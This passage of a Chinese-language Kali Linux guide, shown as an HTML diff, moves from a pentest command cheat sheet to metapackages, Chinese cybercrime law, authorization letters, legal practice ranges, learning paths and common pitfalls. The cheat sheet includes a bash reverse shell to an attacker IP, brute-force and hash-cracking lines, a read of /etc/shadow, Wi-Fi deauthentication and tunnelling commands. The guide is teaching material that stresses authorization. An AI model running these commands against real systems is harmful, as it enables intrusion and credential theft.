+<span class="c"># 全局设置：shell 提示符、元包、免密 sudo、Kali 主题</span>
+sudo kali-tweaks
+
+<span class="c"># 看装了哪些分类工具</span>
+dpkg -l | grep kali-tools
+apt-cache search kali-tools-
+
+<span class="c"># 字典准备</span>
+sudo apt install seclists
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+<span class="c"># Metasploit 数据库（首次初始化，或升级后报错时重来）</span>
+sudo msfdb reinit</code></pre>
+
+    <h3>主机与端口</h3>
+<pre><code><span class="c"># 存活发现（不依赖 ICMP）</span>
+sudo nmap -sn 192.168.56.0/24
+sudo netdiscover -r 192.168.56.0/24
+
+<span class="c"># 快速看常见端口，再全端口</span>
+sudo nmap -sS -sV --top-ports 1000 -T4 --min-rate 1000 10.10.10.5
+sudo nmap -sS -p- -T4 --min-rate 2000 10.10.10.5 -oA full
+
+<span class="c"># 服务专项</span>
+sudo nmap -sV -p 139,445 --script smb-enum-shares,smb-os-discovery 10.10.10.5
+sudo nmap -sU -p 161 --script snmp-info 10.10.10.5
+enum4linux-ng -A 10.10.10.5</code></pre>
+
+    <h3>Web</h3>
+<pre><code><span class="c"># 指纹与目录</span>
+whatweb -a 1 https://example.com
+ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,403 -fs 0
+
+<span class="c"># 漏洞线索（先低风险）</span>
+nuclei -u https://example.com -severity high,critical -rl 50
+nikto -h https://example.com -ssl
+
+<span class="c"># SQL 注入：先确认，再取数据，最后才考虑 shell</span>
+sqlmap -u "https://example.com/item?id=1" --batch --level=2 --risk=1 --dbs
+sqlmap -r req.txt -p id --batch --tables -D appdb
+
+<span class="c"># 代理（Burp 在 8080，ZAP 在 8081）</span>
+curl -x http://127.0.0.1:8080 -k https://example.com/</code></pre>
+
+    <h3>口令与哈希</h3>
+<pre><code><span class="c"># 在线：先确认用户名存在，再小字典试，避免锁号</span>
+hydra -L users.txt -P pass.txt ssh://10.10.10.5 -t 4 -f
+hydra -l admin -P pass.txt 10.10.10.5 http-post-form "/login:username=^USER^&amp;password=^PASS^:F=Invalid"
+
+<span class="c"># 离线：John 先自动识别格式，Hashcat 用 GPU</span>
+unshadow /etc/passwd /etc/shadow &gt; hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -O
+
+<span class="c"># 定制字典</span>
+cewl -d 2 -m 6 -w words.txt https://example.com</code></pre>
+
+    <h3>利用与反弹 shell</h3>
+<pre><code><span class="c"># Metasploit 基本节奏</span>
+msfconsole -q
+msf6 &gt; search type:exploit cve:2021-44228
+msf6 &gt; use 0
+msf6 &gt; show options
+msf6 &gt; set RHOSTS 10.10.10.5
+msf6 &gt; set LHOST 10.10.14.2
+msf6 &gt; run
+
+<span class="c"># 监听端（先开监听，再触发）</span>
+nc -lvnp 4444
+rlwrap nc -lvnp 4444        <span class="c"># 带历史与行编辑，体验接近真 shell</span>
+
+<span class="c"># Linux 目标上的反弹（bash）</span>
+bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1</code></pre>
+
+    <h3>提权检查（拿到 shell 之后）</h3>
+<pre><code><span class="c"># Linux：五分钟内必看的几项</span>
+id; uname -a; cat /etc/os-release
+sudo -l
+find / -perm -4000 -type f 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null
+cat /etc/crontab; ls -la /etc/cron.*
+ss -tulpn
+ls -la /home/* /root 2&gt;/dev/null
+
+<span class="c"># Windows：看补丁、权限、服务、凭据</span>
+whoami /priv
+systeminfo | findstr /B /C:"OS Name" /C:"Hotfix"
+cmdkey /list
+net localgroup administrators</code></pre>
+
+    <h3>横向与隧道</h3>
+<pre><code><span class="c"># 凭据复用（SMB / WinRM）</span>
+nxc smb 10.10.10.0/24 -u user -p 'Passw0rd' --shares
+evil-winrm -i 10.10.10.5 -u user -p 'Passw0rd'
+
+<span class="c"># 内网穿透：chisel + proxychains</span>
+chisel server -p 8000 --reverse            <span class="c"># 攻击机</span>
+./chisel client 10.10.14.2:8000 R:socks    <span class="c"># 目标机</span>
+proxychains4 -q nmap -sT -Pn -p 80,445 172.16.5.10
+
+<span class="c"># 更省事的整段代理</span>
+sshuttle -r user@10.10.10.5 172.16.5.0/24</code></pre>
+
+    <h3>无线（示例：WPA2 握手包）</h3>
+<pre><code>sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap
+
+<span class="c"># 或者：抓 PMKID → 转 hashcat 格式</span>
+sudo hcxdumptool -i wlan0 -o dump.pcapng --enable_status=1
+hcxpcapngtool -o hash.hc22000 dump.pcapng
+hashcat -m 22000 hash.hc22000 rockyou.txt</code></pre>
+
+    <h3>取证与镜像</h3>
+<pre><code><span class="c"># 只读镜像 + 哈希（先确认设备名！）</span>
+lsblk
+sudo dc3dd if=/dev/sdb of=disk.dd hash=sha256 log=image.log
+sha256sum disk.dd &gt; disk.dd.sha256
+
+<span class="c"># 文件系统与内存</span>
+mmls disk.dd &amp;&amp; fls -r -p disk.dd
+vol -f mem.raw windows.pslist
+binwalk -e firmware.bin</code></pre>
+
+    <h3>记录与复现</h3>
+<pre><code><span class="c"># 终端录像（交付证据/写复现步骤）</span>
+asciinema rec -t "acme-10.10.10.5-privesc" evidence.cast
+
+<span class="c"># 截图</span>
+cutycapt --url=http://10.10.10.5/admin --out=admin.png --max-wait=3000</code></pre>
+  </div>
+</section>
+
+<!-- ============ 06 ============ -->
+<section id="pkg">
+  <h2><span class="num">06 / PACKAGES</span>元包：决定你装 200 个还是 600 个工具</h2>
+  <p class="sub">
+    Kali 不靠"一个大镜像装全部"，而是用元包（metapackage）分组。默认镜像只带 <code>kali-linux-default</code> 那一层，
+    剩下的大量工具在仓库里，用一条命令就能补上——也随时能卸掉。
+  </p>
+
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>元包</th><th>包含什么</th><th>什么时候装</th></tr></thead>
+      <tbody>
+        <tr><td><code>kali-linux-core</code></td><td>最小系统：内核、网络、基础命令</td><td>做精简容器镜像、云端跳板</td></tr>
+        <tr><td><code>kali-linux-headless</code></td><td>无桌面，含常用 CLI 工具与 SSH</td><td>服务器/VPS 上做测试节点</td></tr>
+        <tr><td><code>kali-linux-default</code></td><td>官方镜像里预装的那一套</td><td>大多数人的起点</td></tr>
+        <tr><td><code>kali-linux-large</code></td><td>默认 + 更多专项工具</td><td>需要无线、硬件、逆向、取证工具时</td></tr>
+        <tr><td><code>kali-linux-everything</code></td><td>仓库里全部工具，体积十几个 GB</td><td>离线环境、教学机房、不想再装东西</td></tr>
+        <tr><td><code>kali-tools-top10</code></td><td>官方挑选的十来个高频工具</td><td>只想先上手，不想被清单淹没</td></tr>
+        <tr><td><code>kali-tools-web</code> 等</td><td>按分类：<code>information-gathering</code>、<code>vulnerability-analysis</code>、<code>password-attacks</code>、<code>wireless</code>、<code>exploitation</code>、<code>sniffing-spoofing</code>、<code>post-exploitation</code>、<code>forensics</code>、<code>reverse-engineering</code>、<code>reporting-tools</code>、<code>hardware-hacking</code>、<code>social-engineering</code> 等</td><td>按需补一类，不污染系统</td></tr>
+        <tr><td><code>kali-desktop-xfce</code> / <code>-gnome</code> / <code>-kde</code></td><td>桌面环境</td><td>换桌面，或从 headless 装回图形界面</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="cols2">
+    <div class="panel">
+      <h3 style="margin-top:0">常用安装动作</h3>
+<pre style="margin-bottom:0"><code><span class="c"># 只补 Web 这一类</span>
+sudo apt install kali-tools-web
+
+<span class="c"># 大而全（先看磁盘）</span>
+df -h /
+sudo apt install kali-linux-large
+
+<span class="c"># 检查某个工具属于哪个元包</span>
+apt-cache show nmap | grep -i section
+apt-cache rdepends --installed kali-tools-web</code></pre>
+    </div>
+    <div class="panel">
+      <h3 style="margin-top:0">国内镜像（可选）</h3>
+      <p style="font-size:14px">官方源在国外，更新慢时换镜像。写进 <code>/etc/apt/sources.list</code> 前先备份，且<b>不要</b>同时混用多个发行版的源。</p>
+<pre style="margin-bottom:0"><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak
+
+deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free non-free-firmware
+<span class="c"># 或 mirrors.ustc.edu.cn / mirrors.aliyun.com</span>
+
+sudo apt update</code></pre>
+    </div>
+  </div>
+
+  <h3>升级之后工具坏了，按这个顺序修</h3>
+  <ol>
+    <li><b>先看是谁坏了：</b><code>apt list --upgradable</code>、<code>dpkg -l | grep -v ^ii</code>，找出半装的包。</li>
+    <li><b>补依赖：</b><code>sudo apt --fix-broken install</code>，再 <code>sudo dpkg --configure -a</code>。</li>
+    <li><b>重装单个工具：</b><code>sudo apt install --reinstall nmap</code>，比整机重装省事得多。</li>
+    <li><b>Metasploit 起不来：</b><code>sudo msfdb reinit</code>，再检查 <code>systemctl status postgresql</code>。</li>
+    <li><b>驱动/桌面挂了：</b>回滚到升级前的快照。这就是为什么第 2 节强调先拍快照。</li>
+  </ol>
+  <p class="muted" style="font-size:13.5px">
+    维护节奏建议：每周 <code>apt update</code> + 看一次 <code>kali.org/blog</code>；大版本工具升级（如 Metasploit、Burp）前拍快照；
+    客户项目期间<b>不要</b>随手 full-upgrade，环境变了复现结果就不可信了。
+  </p>
+</section>
+
+<!-- ============ 07 ============ -->
+<section id="legal">
+  <h2><span class="num">07 / LEGAL LINE</span>授权不是形式，是唯一的合法性来源</h2>
+  <p class="sub">
+    这一段比上面所有工具都重要。技术失误可以重来，法律问题不行。
+    下面只做常识性说明，具体案件以司法机关认定和专业律师意见为准。
+  </p>
+
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>依据</th><th>管什么</th><th>和你的关系</th></tr></thead>
+      <tbody>
+        <tr><td>《刑法》第 285 条第 1 款</td><td>非法侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统</td><td>行为犯，进入即可能构罪，不看是否造成损失</td></tr>
+        <tr><td>《刑法》第 285 条第 2 款</td><td>非法获取计算机信息系统数据、非法控制计算机信息系统（情节严重）</td><td>拖库、拿 shell、留后门最常落到这一条</td></tr>
+        <tr><td>《刑法》第 285 条第 3 款</td><td>提供侵入、非法控制计算机信息系统的程序、工具</td><td>写/卖"一键渗透"工具也可能担责，不只是使用者</td></tr>
+        <tr><td>《刑法》第 286 条</td><td>破坏计算机信息系统，后果严重</td><td>扫描把服务打挂、删数据、改配置都可能踩到</td></tr>
+        <tr><td>《网络安全法》第 27 条</td><td>禁止非法侵入他人网络、干扰正常功能、窃取数据；禁止提供专门工具；禁止明知而提供支持</td><td>行政处罚层面的直接依据，覆盖"未达刑事标准"的行为</td></tr>
+        <tr><td>《数据安全法》《个人信息保护法》</td><td>数据处理与个人信息处理的合法性、最小必要、安全义务</td><td>测试中接触到的数据同样受管，不能随便留存或外传</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p class="muted" style="font-size:13px">
+    "我只是扫了一下端口""我没拿数据"不是免责理由：未授权扫描本身就可能构成对他人网络正常功能的干扰，
+    而"是否获利"影响的往往只是量刑，不是定性。
+  </p>
+
+  <h3>一份能保护你的授权书，至少写清六件事</h3>
+  <div class="cols2">
+    <div class="panel good">
+      <h3 style="margin-top:0">必须写进去</h3>
+      <ul style="margin-bottom:0">
+        <li><b>主体</b>：委托方全称、盖章、签署日期、有效期</li>
+        <li><b>范围</b>：精确到域名、IP/CIDR、App 包名、账号类型；"相关系统"这种措辞等于没写</li>
+        <li><b>时间窗</b>：允许测试的具体时段（含时区）</li>
+        <li><b>禁止动作</b>：DoS、社工、物理入侵、数据外带、影响生产的写入</li>
+        <li><b>应急联系人</b>：出事时打给谁、多久内响应</li>
+        <li><b>数据条款</b>：加密存储、谁能访问、项目结束多久销毁、是否可留存截图</li>
+      </ul>
+    </div>
+    <div class="panel bad">
+      <h3 style="margin-top:0">这些做法会把你送进去</h3>
+      <ul style="margin-bottom:0">
+        <li>用公司/学校网络扫外网，或"顺手"扫同网段的其他主机</li>
+        <li>拿真实客户、真实学校、真实医院当练手目标</li>
+        <li>测自家 WiFi 之外的热点，"就试一下"</li>
+        <li>把客户数据拷回本机"做分析"，项目结束也不删</li>
+        <li>在生产环境跑 <code>sqlmap --dump-all</code>、<code>--os-shell</code></li>
+        <li>把未修复漏洞、凭据、内网拓扑发到群里或写成公众号文章</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>合法的练习场，够你练到中级</h3>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>平台</th><th>适合</th><th>特点</th></tr></thead>
+      <tbody>
+        <tr><td>TryHackMe</td><td>零基础到初级</td><td>有引导式房间，浏览器内直接打，不用配环境</td></tr>
+        <tr><td>Hack The Box</td><td>初级到中高级</td><td>真实感强、无引导，适合练独立作战和写报告</td></tr>
+        <tr><td>PortSwigger Web Security Academy</td><td>Web 方向</td><td>免费、体系化，配套靶场覆盖 OWASP Top 10 全部实验</td></tr>
+        <tr><td>VulnHub</td><td>离线练手</td><td>下载虚拟机镜像，本地开打，适合没网/低带宽</td></tr>
+        <tr><td>OWASP Juice Shop / DVWA</td><td>Web 入门</td><td>本地 Docker 一条命令起，随便折腾</td></tr>
+        <tr><td>Metasploitable 2/3</td><td>系统渗透入门</td><td>故意留洞的 Linux 靶机，配合 Metasploit 教学</td></tr>
+        <tr><td>自建隔离实验室</td><td>任意阶段</td><td>VMware/VirtualBox 的 Host-only 网段，攻防机 + 靶机 + 防火墙，最贴近真实又完全可控</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="panel warn">
+    <h3 style="margin-top:0">靶场也有边界</h3>
+    <p style="margin-bottom:0">
+      靶场授权只覆盖靶场本身。用靶场里学到的技术去测同一台宿主机、同一网段的其他设备，
+      或者把靶场里的 webshell 当跳板扫内网，都已经出了授权范围。练习环境最好单独建一个虚拟网段，
+      并且<b>不要</b>把它桥接到家庭/公司局域网。
+    </p>
+  </div>
+</section>
+
+<!-- ============ 08 ============ -->
+<section id="learn">
+  <h2><span class="num">08 / LEARNING PATH</span>三条路线，别从"工具大全"开始背</h2>
+  <p class="sub">
+    工具会过时，方法不会。下面三条路线的前两周是重合的（Linux + 网络 + 一门脚本语言），
+    之后按你的目标分叉。时间按每天 1–2 小时估算，全职学习可以压缩到一半。
+  </p>
+
+  <div data-tabs>
+    <div class="tabs" role="tablist" aria-label="学习路线">
+      <button class="tab" role="tab" id="t1" aria-controls="p1" aria-selected="true" type="button">渗透测试（红队入门）</button>
+      <button class="tab" role="tab" id="t2" aria-controls="p2" aria-selected="false" type="button">蓝队 / 防守</button>
+      <button class="tab" role="tab" id="t3" aria-controls="p3" aria-selected="false" type="button">取证与应急响应</button>
+    </div>
+
+    <div class="tabpanel" role="tabpanel" id="p1" aria-labelledby="t1" tabindex="0">
+      <h4 style="margin-top:0">第 1–2 周：地基</h4>
+      <p>Linux 命令行（权限、进程、网络、日志）、TCP/IP 与 HTTP 基础、Python 能读能改。别急着开 Burp，先把 <code>ss -tulpn</code>、<code>find</code>、<code>grep</code>、<code>curl</code> 用熟。</p>
+      <h4>第 3 周：侦察与枚举</h4>
+      <p>nmap 的参数逻辑（为什么 <code>-sS</code> 要 root、<code>-Pn</code> 解决什么）、目录爆破的字典选择、SMB/LDAP 枚举。目标是看到端口就知道下一步查什么。</p>
+      <h4>第 4–5 周：Web</h4>
+      <p>Burp 代理与 Repeater、SQL 注入（手工判断 + sqlmap 验证）、文件上传/包含、越权与逻辑漏洞。配合 PortSwigger Academy 的实验，一天两个。</p>
+      <h4>第 6–8 周：系统渗透</h4>
+      <p>Metasploit 的模块逻辑、Linux/Windows 提权检查清单、凭据复用。打 3–5 台 HTB Easy 机器，每台都写一份带时间线的报告。</p>
+      <h4>第 9–12 周：内网与考试准备</h4>
+      <p>Active Directory 基础、BloodHound、横向与隧道。如果目标是 OSCP，按 PEN-200 的章节走，并做完整 24 小时模拟考。</p>
+      <p class="muted" style="margin-bottom:0">认证参考：OSCP（PEN-200）是业界最认的实操认证；OSWP 偏无线；OSWE 偏 Web 代码审计。国内可看 CISP-PTE 等，但含金量与用途不同，按雇主要求选。</p>
+    </div>
+
+    <div class="tabpanel" role="tabpanel" id="p2" aria-labelledby="t2" tabindex="0" hidden>
+      <h4 style="margin-top:0">第 1–2 周：先学会看流量</h4>
+      <p>Wireshark 过滤器、TCP 三次握手与 TLS 握手、DNS/HTTP 日志长什么样。防守方的核心能力是"从噪声里分辨异常"，不是"会背规则"。</p>
+      <h4>第 3–4 周：检测栈</h4>
+      <p>Suricata 规则语法与 <code>suricata-update</code>、Zeek 日志字段、Sigma 规则思路。搭一套最小环境：一台靶机 + 一台 Suricata + 一个查看日志的界面。</p>
+      <h4>第 5–6 周：主机与身份</h4>
+      <p>Wazuh/OSSEC 的 FIM 与日志采集、Windows 事件日志关键 ID（4624/4625/4688/7045）、Linux auditd。学会写一条能落地的检测规则。</p>
+      <h4>第 7–8 周：对抗验证</h4>
+      <p>用 CALDERA / Atomic Red Team 按 ATT&CK 跑一遍，看自己的规则命不命中。这一步能把"纸面检测"变成"有效检测"。</p>
+      <h4>第 9–12 周：SOC 流程</h4>
+      <p>TheHive 工单、MISP 情报、告警分级与误报治理。Kali Purple 适合做这个阶段的实验平台。</p>
+      <p class="muted" style="margin-bottom:0">认证参考：蓝队方向更看平台经验（Splunk/Elastic/Chronicle）与事件复盘数量，认证（如 GCIA、蓝队相关厂商认证）是加分项而非门槛。</p>
+    </div>
+
+    <div class="tabpanel" role="tabpanel" id="p3" aria-labelledby="t3" tabindex="0" hidden>
+      <h4 style="margin-top:0">第 1–2 周：证据链意识</h4>
+      <p>只读、哈希、时间线、保管链（chain of custody）。先学 <code>dc3dd</code> + <code>sha256sum</code> + 记录表，再学工具。</p>
+      <h4>第 3–4 周：磁盘与文件系统</h4>
+      <p>Sleuth Kit 的 <code>mmls</code>/<code>fls</code>/<code>icat</code>、Autopsy 的时间线视图、文件雕复（foremost）。拿一个旧 U 盘做练习目标。</p>
+      <h4>第 5–6 周：内存与日志</h4>
+      <p>Volatility 3 的进程/网络/注入插件、Windows 事件日志与 $MFT、Linux journal。学会把"进程 → 网络连接 → 文件"串起来。</p>
+      <h4>第 7–8 周：恶意样本初筛</h4>
+      <p>静态：strings、oletools、pdf-parser、YARA；动态：隔离虚拟机 + Procmon/strace。永远不要在宿主机上双击样本。</p>
+      <h4>第 9–12 周：完整案件演练</h4>
+      <p>用一个公开取证镜像（如 DFIR 训练集）做完整流程：接案 → 镜像 → 分析 → 时间线 → 报告 → 复盘。</p>
+      <p class="muted" style="margin-bottom:0">认证参考：GCFE/GCFA（SANS）、ACE（AccessData）等；国内电子数据取证相关资质也有对应体系。</p>
+    </div>
+  </div>
+
+  <h3>一张 4 周速览表（通用地基）</h3>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>周</th><th>主题</th><th>可验收的产出</th></tr></thead>
+      <tbody>
+        <tr><td>W1</td><td>Linux + 网络基础</td><td>能不看教程完成：装 Kali、配网、用 nmap 扫自己网段、解释每条命令在做什么</td></tr>
+        <tr><td>W2</td><td>侦察与枚举</td><td>对一个合法靶场做完整资产清单，含端口、服务、版本、入口猜测</td></tr>
+        <tr><td>W3</td><td>Web 与口令</td><td>手工复现 3 个 Web 漏洞 + 破解一个靶场哈希（离线）</td></tr>
+        <tr><td>W4</td><td>系统渗透与报告</td><td>打穿 1 台靶机，交付一份 5 页以内的报告（含证据与修复建议）</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ============ 09 ============ -->
+<section id="pitfalls">
+  <h2><span class="num">09 / PITFALLS</span>十个高频坑，都是真实浪费时间的那种</h2>
+  <p class="sub">这些问题在论坛和群里每天都会出现。提前知道，能省掉很多"是不是我装错了"的自我怀疑。</p>
+
+  <details>
+    <summary>1. 密码不对：kali/kali 只适用于预构建镜像</summary>
+    <p>官方 VM/容器镜像默认是 <code>kali</code>/<code>kali</code>；用 Installer ISO 自己装的系统，密码是安装时设的。
+       忘了密码就进 recovery mode 改，或者在 GRUB 里加 <code>init=/bin/bash</code> 后 <code>passwd</code>。</p>
+  </details>
+
+  <details>
+    <summary>2. john 报找不到 rockyou.txt</summary>
+    <p>Kali 里它是压缩的：<code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code>。
+       顺便，<code>seclists</code> 不在默认镜像里，要 <code>sudo apt install seclists</code>。</p>
+  </details>
+
+  <details>
+    <summary>3. 无线网卡切不了监听模式</summary>
+    <p>先确认芯片支持 monitor + injection（AR9271、RT3070、RTL8812AU 常见，Intel 内置网卡基本不行）。
+       虚拟机上还要把 USB 网卡直通给 Kali。<code>airmon-ng</code> 之后用 <code>iw dev</code> 看接口名是不是变了。</p>
+  </details>
+
+  <details>
+    <summary>4. 虚拟机里 hashcat 慢得离谱</summary>
+    <p>没有 GPU 直通时只能用 CPU，速度差几十倍。要么实体机跑，要么用支持 PCIe 直通的宿主（Linux + VFIO），
+       要么干脆把哈希拿出去在别的机器上跑——注意数据合规。</p>
+  </details>
+
+  <details>
+    <summary>5. nmap 报 "requires root privileges"</summary>
+    <p><code>-sS</code>（SYN 扫描）需要 raw socket。加 <code>sudo</code>，或者改用 <code>-sT</code>。
+       在 WSL/容器里即使 root 也可能行为异常，扫描结果要和真机对照。</p>
+  </details>
+
+  <details>
+    <summary>6. DNS 突然不通 / resolv.conf 被改回去</summary>
+    <p>NetworkManager 会覆盖 <code>/etc/resolv.conf</code>。用 <code>nmcli</code> 改连接配置，或把文件设为不可变（<code>chattr +i</code>，记得改回来），
+       别直接手写文件然后纳闷为什么重启就丢。</p>
+  </details>
+
+  <details>
+    <summary>7. Kerberos / 域相关工具全部时间错误</summary>
+    <p>域环境要求时间偏差在 5 分钟内。虚拟机休眠后时间会飘，<code>sudo ntpdate dc.corp.local</code>
+       或配置 chrony 指向域控，再跑 impacket 那套工具。</p>
+  </details>
+
+  <details>
+    <summary>8. 教程里的命令不存在了（改名/移除）</summary>
+    <p>典型：CrackMapExec → NetExec（<code>nxc</code>）、部分 Python 2 工具被移除、<code>sslstrip</code> 已废弃。
+       遇到 <code>command not found</code>，先 <code>apt search 关键词</code>，再看工具官网的迁移说明。</p>
+  </details>
+
+  <details>
+    <summary>9. apt upgrade 之后桌面/网络挂了</summary>
+    <p>滚动发行偶尔会遇到依赖冲突或驱动不兼容。正确姿势：升级前拍快照；挂了就回滚，然后只重装有问题的包
+       （<code>sudo apt install --reinstall 包名</code>）。不要在没有快照的情况下 full-upgrade。</p>
+  </details>
+
+  <details>
+    <summary>10. WSL 里工具"能装不能用"</summary>
+    <p>WSL2 没有无线、raw socket 受限、无 systemd（新版可开）、GUI 需要 WSLg。它适合跑 sqlmap/ffuf/impacket 这类用户态工具，
+       不适合做嗅探、无线、依赖内核模块的事情。要完整能力还是虚拟机或实体机。</p>
+  </details>
+
+  <details>
+    <summary>11. 扫描把目标打挂了，或者自己被封了</summary>
+    <p>并发和速率是最常见的肇事原因：ffuf 默认 40 线程、nuclei 默认高并发、masscan 默认速率就很猛。
+       对生产系统先 <code>-t 5</code>/<code>-rl 20</code>，观察响应时间再逐步加。被封 IP 后换源也未必有用，先降速。</p>
+  </details>
+
+  <details>
+    <summary>12. 忘了记录，报告写不出来</summary>
+    <p>所有命令用 <code>-oA</code>/<code>-o</code> 落盘，终端用 <code>script</code> 或 <code>asciinema</code> 录，
+       发现漏洞立刻存请求响应原文。<b>当天</b>整理，隔天记忆就会漏掉关键一步。</p>
+  </details>
+</section>
+
+<!-- ============ 10 ============ -->
+<section id="links">
+  <h2><span class="num">10 / SOURCES</span>去哪里看一手信息</h2>
+  <p class="sub">工具清单会变、命令参数会变，下面这些是应该长期订阅的来源。离线阅读时链接不可点，但地址本身有参考价值。</p>
+
+  <div class="links">
+    <div><b>Kali 官方文档</b><a href="https://www.kali.org/docs/" target="_blank" rel="noopener noreferrer">kali.org/docs</a></div>
+    <div><b>Kali 工具目录</b><a href="https://www.kali.org/tools/" target="_blank" rel="noopener noreferrer">kali.org/tools</a></div>
+    <div><b>Kali 博客（版本与变更）</b><a href="https://www.kali.org/blog/" target="_blank" rel="noopener noreferrer">kali.org/blog</a></div>
+    <div><b>Kali 论坛</b><a href="https://forums.kali.org/" target="_blank" rel="noopener noreferrer">forums.kali.org</a></div>
+    <div><b>OffSec 课程（PEN-200/OSCP）</b><a href="https://www.offsec.com/courses/pen-200/" target="_blank" rel="noopener noreferrer">offsec.com/courses</a></div>
+    <div><b>Exploit-DB</b><a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">exploit-db.com</a></div>
+    <div><b>MITRE ATT&amp;CK</b><a href="https://attack.mitre.org/" target="_blank" rel="noopener noreferrer">attack.mitre.org</a></div>
+    <div><b>GTFOBins（Linux 提权）</b><a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">gtfobins.github.io</a></div>
+    <div><b>LOLBAS（Windows 二进制滥用）</b><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">lolbas-project.github.io</a></div>
+    <div><b>PayloadsAllTheThings</b><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">github.com/swisskyrepo/PayloadsAllTheThings</a></div>
+    <div><b>HackTricks</b><a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">book.hacktricks.xyz</a></div>
+    <div><b>PortSwigger Academy</b><a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">portswigger.net/web-security</a></div>
+    <div><b>Hack The Box</b><a href="https://www.hackthebox.com/" target="_blank" rel="noopener noreferrer">hackthebox.com</a></div>
+    <div><b>TryHackMe</b><a href="https://tryhackme.com/" target="_blank" rel="noopener noreferrer">tryhackme.com</a></div>
+    <div><b>VulnHub</b><a href="https://www.vulnhub.com/" target="_blank" rel="noopener noreferrer">vulnhub.com</a></div>
+    <div><b>SecLists</b><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">github.com/danielmiessler/SecLists</a></div>
+    <div><b>OWASP Juice Shop</b><a href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener noreferrer">owasp.org · Juice Shop</a></div>
+    <div><b>DFIR 训练镜像（Volatility 等）</b><a href="https://github.com/volatilityfoundation/volatility3" target="_blank" rel="noopener noreferrer">github.com/volatilityfoundation</a></div>
+  </div>
+
+  <div class="panel">
+    <h3 style="margin-top:0">最后一句</h3>
+    <p style="margin-bottom:0">
+      Kali 的价值不在"装了多少工具"，而在于它把环境准备好了，让你能把注意力放在<strong>判断</strong>上：
+      这个端口说明了什么、这条报错意味着哪条路径、这个证据能不能支撑结论。
+      工具清单可以背，判断力只能靠一台一台机器打出来——从合法靶场开始，把每一台都写成报告。
+    </p>
+  </div>
+</section>
+
+</div>
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>Kali Linux 使用指南 · 工具地图与实操手册</span>
+    <span>仅限授权测试、自有环境与防御性研究</span>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+
+  /* ---------- 1. 工具筛选 + 搜索 ---------- */
+  var cards = Array.prototype.slice.call(document.querySelectorAll(".card"));
+  var chips = Array.prototype.slice.call(document.querySelectorAll(".chip"));
+  var input = document.getElementById("q");
+  var count = document.getElementById("count");
+  var empty = document.getElementById("empty");
+  var activeCat = "all";
+  var total = cards.length;
+
+  var index = cards.map(function (card) {
+    return (card.textContent || "").toLowerCase();
+  });
+
+  var perCat = {};
+  cards.forEach(function (card) {
+    var c = card.getAttribute("data-cat");
+    perCat[c] = (perCat[c] || 0) + 1;
+  });
+
+  chips.forEach(function (chip) {
+    var c = chip.getAttribute("data-cat");
+    var n = c === "all" ? total : (perCat[c] || 0);
+    var badge = document.createElement("span");
+    badge.className = "c";
+    badge.textContent = n;
+    chip.appendChild(badge);
+    if (c === "all") chip.firstChild.nodeValue = "全部 ";
+  });
+
+  function apply() {
+    var q = (input.value || "").trim().toLowerCase();
+    var shown = 0;
+    cards.forEach(function (card, i) {
+      var catOk = activeCat === "all" || card.getAttribute("data-cat") === activeCat;
+      var textOk = q === "" || index[i].indexOf(q) !== -1;
+      var visible = catOk && textOk;
+      card.hidden = !visible;
+      if (visible) shown++;
+    });
+    count.textContent = "显示 " + shown + " / " + total;
+    empty.hidden = shown !== 0;
+  }
+
+  chips.forEach(function (chip) {
+    chip.addEventListener("click", function () {
+      activeCat = chip.getAttribute("data-cat");
+      chips.forEach(function (c) {
+        c.setAttribute("aria-pressed", c === chip ? "true" : "false");
+      });
+      apply();
+    });
+  });
+
+  if (input) {
+    input.addEventListener("input", apply);
+    input.addEventListener("keydown", function (e) {
+      if (e.key === "Escape") { input.value = ""; apply(); }
+    });
+  }
+
+  /* ---------- 2. 代码复制 ---------- */
+  Array.prototype.slice.call(document.querySelectorAll("pre")).forEach(function (pre) {
+    var wrap = document.createElement("div");
+    wrap.className = "codewrap";
+    pre.parentNode.insertBefore(wrap, pre);
+    wrap.appendChild(pre);
+
+    var btn = document.createElement("button");
+    btn.type = "button";
+    btn.className = "copy";
+    btn.textContent = "复制";
+    btn.setAttribute("aria-label", "复制这段代码");
+
+    btn.addEventListener("click", function () {
+      var text = pre.innerText;
+      function done(ok) {
+        btn.textContent = ok ? "已复制" : "失败";
+        setTimeout(function () { btn.textContent = "复制"; }, 1600);
+      }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
